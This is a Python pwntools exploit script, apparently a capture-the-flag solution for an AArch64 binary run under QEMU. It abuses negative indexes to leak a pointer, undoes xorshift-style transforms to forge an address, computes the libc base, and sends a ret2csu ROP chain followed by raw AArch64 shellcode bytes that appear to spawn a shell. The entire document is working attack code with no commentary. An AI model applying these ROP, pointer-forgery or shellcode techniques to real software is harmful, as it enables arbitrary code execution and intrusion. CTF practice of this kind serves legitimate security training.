from pwn import *
context.arch = 'amd64'
context.log_level = 'debug'

r = process(["qemu-aarch64", "-cpu", "max", "-L", ".", "./chall"])

def lock(idx):
    r.sendlineafter(">> ", '2')
    r.sendlineafter("idx: ", str(idx))

def show():
    r.sendlineafter(">> ", '3')

def auth(idx):
    r.sendlineafter(">> ", '4')
    r.sendlineafter("idx: ", str(idx))

def unshiftl(a,s,m=2**64-1):
    i=0
    while i*s<64:
        lenm=((2**64-1)>>(64-s))<<(s*i)
        a^=((a&lenm)<<s)&m
        i+=1
    return a

def unshiftr(a,s,m=2**64-1):
    i=0
    while i*s<64:
        lenm=(((2**64-1)<<(64-s))&(2**64-1))>>(s*i)
        a^=((a&lenm)>>s)&m
        i+=1
    return a

elf = ELF("./chall")
libc = ELF("/usr/aarch64-linux-gnu/lib/libc-2.31.so")

csu1 = 0x400FF8
csu2 = 0x400FD8 

sh = p64(csu1) + p64(0)
sh += p64(1145141919810) + p64(0)

r.sendafter("name: ", sh)

lock(-1)
lock(-2)

show()
r.recvuntil("name: ")
a = u64(r.recv(8))
a = unshiftr(a, 13)
a = unshiftl(a, 31)
a = unshiftr(a, 11)
a = unshiftl(a, 7)
info("forged addr: 0x%lx" % a)

auth(-1)

b = 0x40008a66b0 - libc.sym['puts']
libc.address = b
info("libc: 0x%lx" % b)
info("system: 0x%lx" % libc.sym['system'])

sh = b"a"*0x28
sh += p64(a)
sh += p64(0) + p64(csu2)
sh += p64(0) + p64(1)
sh += p64(elf.got['read']) + p64(0)
sh += p64(0x412060) + p64(0x100)

sh += p64(0) + p64(csu2)
sh += p64(0) + p64(1)
sh += p64(0x412060) + p64(0)
sh += p64(0) + p64(0)

r.send(sh)
r.send(p64(0x412068) + b"\xe1\x45\x8c\xd2\x21\xcd\xad\xf2\xe1\x65\xce\xf2\x01\x0d\xe0\xf2\xe1\x8f\x1f\xf8\xe1\x03\x1f\xaa\xe2\x03\x1f\xaa\xe0\x63\x21\x8b\xa8\x1b\x80\xd2\xe1\x66\x02\xd4")

r.interactive()
